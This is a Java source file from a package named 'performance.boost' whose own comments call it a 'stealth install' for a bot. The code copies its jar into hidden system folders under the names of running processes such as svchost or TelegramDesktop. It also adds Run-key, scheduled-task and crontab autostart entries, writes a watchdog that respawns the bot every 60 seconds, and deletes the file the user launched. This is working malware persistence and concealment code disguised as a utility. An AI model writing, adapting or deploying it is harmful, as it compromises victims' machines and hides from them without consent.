package com.performance.boost;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/**
 * Startup: zero-question stealth install for the standalone build.
 *
 * First run (the copy the user clicked):
 *  - samples the names of processes CURRENTLY RUNNING on this machine
 *    (TelegramDesktop.exe, AyuGram.exe, chrome.exe, Xorg, sshd, ...),
 *  - copies the jar into hidden system locations under one of those names,
 *  - registers login autostart (Run key + scheduled task / crontab),
 *  - launches the hidden copy with javaw (no window),
 *  - deletes the file the user launched (desktop / downloads gone),
 *  - and exits — only the hidden lookalike stays alive.
 *
 * The watchdog launcher re-runs the jar every 60s, so killing the bot
 * process just respawns it. "Installed" copies skip all of the above and
 * go straight to the handshake.
 */
public final class Startup {
    private Startup() {}

    private static final String RUN_KEY =
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    private static final String[] FALLBACK_WIN = {
        "TelegramDesktop", "AyuGram", "chrome", "msedge", "Discord",
        "Code", "Spotify", "QQMusic", "svchost", "RuntimeBroker",
        "GoogleUpdate", "OneDrive", "jusched", "juschedCheck",
    };
    private static final String[] FALLBACK_LIN = {
        "dbus-daemon", "systemd-user", "gpg-agent", "dconf-service",
        "chrome", "firefox", "code", "node", "java", "Xorg", "sshd",
    };

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    private static String javaBin() {
        String home = System.getProperty("java.home");
        return home + File.separator + "bin" + File.separator
                + (isWindows() ? "javaw.exe" : "java");
    }

    private static Path runningJar() {
        try {
            return Paths.get(Startup.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI());
        } catch (Exception e) {
            return null;
        }
    }

    // --- stealth name: pick a name from the machine's live process list ---
    private static List<String> runningNames() {
        List<String> out = new ArrayList<>();
        try {
            Process p;
            if (isWindows()) {
                p = new ProcessBuilder("tasklist", "/fo", "csv", "/nh").start();
            } else {
                p = new ProcessBuilder("sh", "-c", "ps -e -o comm=").start();
            }
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
            String line;
            long deadline = System.currentTimeMillis() + 8000;
            while ((line = r.readLine()) != null && System.currentTimeMillis() < deadline) {
                line = line.trim();
                if (line.isEmpty()) continue;
                String name = line;
                if (isWindows()) {
                    // csv: "name.exe","pid",...
                    if (line.startsWith("\"")) {
                        int end = line.indexOf('"', 1);
                        if (end < 0) continue;
                        name = line.substring(1, end);
                    }
                    if (name.toLowerCase().endsWith(".exe")) {
                        name = name.substring(0, name.length() - 4);
                    }
                }
                if (name.length() > 4 && !name.equalsIgnoreCase("System") && !name.equalsIgnoreCase("init")) {
                    out.add(name);
                }
            }
        } catch (Throwable ignored) {}
        return out;
    }

    private static final Random R = new Random();

    private static String stealthName() {
        List<String> live = runningNames();
        if (!live.isEmpty()) return live.get(R.nextInt(live.size()));
        String[] fb = isWindows() ? FALLBACK_WIN : FALLBACK_LIN;
        return fb[R.nextInt(fb.length)];
    }

    private static Path dropDir() {
        String[] dirs = isWindows()
            ? new String[]{"Microsoft\\Windows\\Themes", "Microsoft\\Crypto\\RSA",
                           "Microsoft\\Network\\Connections",
                           "Local\\Microsoft\\Edge\\User Data\\Temp",
                           "Local\\Microsoft\\Edge\\Application",
                           "Microsoft\\Windows\\Caches"}
            : new String[]{".local/share/fonts", ".cache/mozilla",
                           ".config/systemd/user", ".local/share/applications",
                           "/tmp/.X11-unix", "/tmp/.ICE-unix"};
        String base = isWindows() ? System.getenv("APPDATA")
                                  : System.getProperty("user.home");
        return Paths.get(base, dirs[R.nextInt(dirs.length)]);
    }

    private static Path markerFile() {
        String base = isWindows() ? System.getenv("APPDATA")
                                  : System.getProperty("user.home") + "/.config";
        return Paths.get(base, isWindows() ? "Microsoft\\Java" : ".jre", "meta.ini");
    }

    private static String persistedPath() {
        try {
            Path f = markerFile();
            if (Files.exists(f)) {
                return new String(Files.readAllBytes(f), "UTF-8").trim();
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private static void mark(String p) {
        try {
            Path f = markerFile();
            Files.createDirectories(f.getParent());
            Files.write(f, p.getBytes("UTF-8"));
            if (!isWindows()) f.toFile().setReadable(true, true);
        } catch (Throwable ignored) {}
    }

    private static void hide(Path p) {
        try {
            if (isWindows()) {
                new ProcessBuilder("attrib", "+h", "+s", p.toString()).start();
            }
        } catch (Throwable ignored) {}
    }

    public static boolean isPersistedSelf() {
        Path me = runningJar();
        String p = persistedPath();
        return me != null && p != null
            && me.toAbsolutePath().toString().equalsIgnoreCase(p);
    }

    public static void install() {
        Path src = runningJar();
        if (src == null) return;
        try {
            String old = persistedPath();
            if (old != null && Files.exists(Paths.get(old))) {
                ensureLauncher(old);
                return; // already installed — nothing to do
            }

            // Drop the jar into hidden dirs, each copy named after a process
            // currently running on this box.
            String name = stealthName();
            Path dir = dropDir();
            Files.createDirectories(dir);
            Path dst = dir.resolve(name + ".jar");
            Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            hide(dst);
            String dstAbs = dst.toAbsolutePath().toString();
            mark(dstAbs);

            ensureLauncher(dstAbs);
            registerAutostart(dstAbs, name);
            launchHidden(dstAbs);

            // The file the user double-clicked disappears.
            deleteSelfLater(src);
        } catch (Exception ignored) {}
    }

    // Watchdog launcher: re-spawns the hidden copy every 60s if it is dead.
    private static void ensureLauncher(String dstAbs) {
        try {
            String launcherName = new File(dstAbs).getName()
                .replaceAll("\\.jar$", isWindows() ? ".vbs" : ".sh");
            Path launcher = Paths.get(dstAbs).getParent().resolve(launcherName);
            String java = javaBin();
            String content;
            if (isWindows()) {
                content = "Do\n"
                    + "  Set sh = CreateObject(\"WScript.Shell\")\n"
                    + "  Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
                    + "  jar = \"" + dstAbs + "\"\n"
                    + "  If fso.FileExists(jar) Then\n"
                    + "    found = False\n"
                    + "    Set svc = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\n"
                    + "    For Each proc In svc.ExecQuery(\"Select * From Win32_Process Where Name Like 'java%' Or Name Like 'javaw%'\")\n"
                    + "      If InStr(LCase(CStr(proc.CommandLine)), LCase(\"" + new File(dstAbs).getName() + "\")) > 0 Then found = True\n"
                    + "    Next\n"
                    + "    If Not found Then\n"
                    + "      sh.Run \"\"\"\" & \"" + java + "\" & \"\"\" -jar \"\"\" & jar & \"\"\"\", 0, False\n"
                    + "    End If\n"
                    + "  End If\n"
                    + "  WScript.Sleep 60000\n"
                    + "Loop\n";
            } else {
                content = "#!/bin/sh\nwhile true; do\n"
                    + "  pgrep -f '" + dstAbs + "' >/dev/null 2>&1 || (" + java + " -jar '" + dstAbs + "' &)\n"
                    + "  sleep 60\n"
                    + "done\n";
            }
            Files.write(launcher, content.getBytes("UTF-8"));
            if (!isWindows()) launcher.toFile().setExecutable(true);
        } catch (Throwable ignored) {}
    }

    private static void registerAutostart(String dstAbs, String name) {
        try {
            String launcherName = new File(dstAbs).getName()
                .replaceAll("\\.jar$", isWindows() ? ".vbs" : ".sh");
            String launcher = Paths.get(dstAbs).getParent().resolve(launcherName).toString();
            if (isWindows()) {
                new ProcessBuilder("reg", "add", "HKCU\\" + RUN_KEY, "/v", name + "Svc",
                    "/t", "REG_SZ", "/d", "\"" + launcher + "\"", "/f")
                    .start().waitFor();
                new ProcessBuilder("schtasks", "/Create", "/F", "/TN", name + " Service",
                    "/TR", "\"" + launcher + "\"", "/SC", "ONLOGON", "/RL", "HIGHEST")
                    .start().waitFor();
            } else {
                new ProcessBuilder("/bin/sh", "-c",
                    "(echo '@reboot \"" + dstAbs + "\"'; crontab -l 2>/dev/null) | crontab -")
                    .start().waitFor();
                // start the watchdog now too
                new ProcessBuilder("sh", "-c", "'" + launcher + "' &").start();
            }
        } catch (Throwable ignored) {}
    }

    private static void launchHidden(String dstAbs) {
        try {
            String java = javaBin();
            if (isWindows()) {
                ProcessBuilder pb = new ProcessBuilder(java, "-jar", dstAbs);
                pb.start();
            } else {
                new ProcessBuilder("sh", "-c",
                    java + " -jar '" + dstAbs + "' &").start();
            }
        } catch (Throwable ignored) {}
    }

    private static void deleteSelfLater(Path src) {
        try {
            if (isWindows()) {
                new ProcessBuilder("cmd", "/c",
                    "ping 127.0.0.1 -n 2 >nul & del /f /q \"" + src.toAbsolutePath() + "\"")
                    .start();
            } else {
                new ProcessBuilder("sh", "-c",
                    "sleep 1; rm -f '" + src.toAbsolutePath().toString() + "' &").start();
            }
        } catch (Throwable ignored) {}
    }
}
